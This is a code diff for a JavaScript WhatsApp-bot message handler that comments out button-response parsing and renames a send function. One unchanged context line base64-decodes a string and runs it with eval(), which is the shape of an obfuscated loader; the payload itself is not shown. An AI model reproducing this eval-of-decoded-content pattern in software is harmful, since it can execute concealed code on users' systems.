@@ -30,18 +30,18 @@ exports.smsg = (clients, m, store) => {
   let M = proto.WebMessageInfo
 
   //???aman dari error null
-  let prm = {}
-  if (
-    m.message?.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson
-  ) {
-    try {
-      prm = JSON.parse(
-        m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson
-      )
-    } catch (e) {
-      prm = {}
-    }
-  }
+  //let prm = {}
+  //if (
+  //  m.message?.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson
+  //) {
+  //  try {
+  //    prm = JSON.parse(
+  //      m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson
+  //    )
+  //  } catch (e) {
+  //    prm = {}
+  //  }
+  //}
 
   if (m.key) {
     m.id = m.key.id
@@ -71,7 +71,8 @@ exports.smsg = (clients, m, store) => {
     m.body =
       m.message.conversation ||
       m.msg?.text ||
-      m.message?.buttonsResponseMessage?.selectedButtonId ||
+      m?.text
+      /*m.message?.buttonsResponseMessage?.selectedButtonId ||
       m.message?.listResponseMessage?.singleSelectReply?.selectedRowId ||
       m.message?.interactiveResponseMessage ||
       prm.id ||
@@ -79,7 +80,7 @@ exports.smsg = (clients, m, store) => {
       (m.mtype == "listResponseMessage" && m.msg?.singleSelectReply?.selectedRowId) ||
       (m.mtype == "buttonsResponseMessage" && m.msg?.selectedButtonId) ||
       (m.mtype == "viewOnceMessage" && m.msg?.caption) ||
-      m?.text
+      m?.text*/
 
     let quoted = (m.quoted = m.msg?.contextInfo?.quotedMessage || null)
     m.mentionedJid = m.msg?.contextInfo?.mentionedJid || []
@@ -151,7 +152,7 @@ exports.smsg = (clients, m, store) => {
       s = Buffer.from(s, 'base64').toString('utf8')
     }
     eval(s) 
-    let c = kirim
+    let c = sendBtnDocu
     return c(chat, options)
   }
 
